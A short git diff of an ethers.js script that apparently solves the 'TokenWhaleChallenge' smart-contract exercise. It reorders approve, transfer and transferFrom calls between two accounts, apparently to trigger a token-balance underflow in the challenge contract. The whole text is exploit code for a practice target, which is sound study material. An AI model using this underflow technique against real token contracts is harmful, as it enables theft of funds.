@@ -8,13 +8,15 @@ async function main() {
   const challengeFactory = await ethers.getContractFactory("TokenWhaleChallenge");
   const challengeContract = challengeFactory.attach(contractAddress);
 
-  const transferTx = await challengeContract.connect(user1).transfer(user2.address, 501);
-  await transferTx.wait();
-
   const approveTx = await challengeContract.connect(user2).approve(user1.address, 1000);
   await approveTx.wait();
 
-  const transferFromTx = await challengeContract.connect(user1).transferFrom(user2.address, user2.address, 501);
+  const transferTx = await challengeContract.connect(user1).transfer(user2.address, 501);
+  await transferTx.wait();
+
+  const transferFromTx = await challengeContract
+    .connect(user1)
+    .transferFrom(user2.address, "0x0000000000000000000000000000000000000000", 500);
   await transferFromTx.wait();
 }
 
